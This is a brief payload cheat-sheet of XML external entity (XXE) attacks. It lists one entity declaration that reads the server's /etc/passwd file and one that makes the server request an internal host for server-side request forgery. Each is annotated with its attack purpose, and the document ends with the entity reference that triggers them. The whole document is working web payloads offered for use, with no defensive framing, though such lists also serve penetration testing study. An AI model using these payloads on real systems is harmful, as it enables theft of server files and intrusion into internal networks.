# XXE Payloads
```html
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>  >> For retrieving server files.

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website/"> ]>  >> For SSRF attack.

&xxe;
```
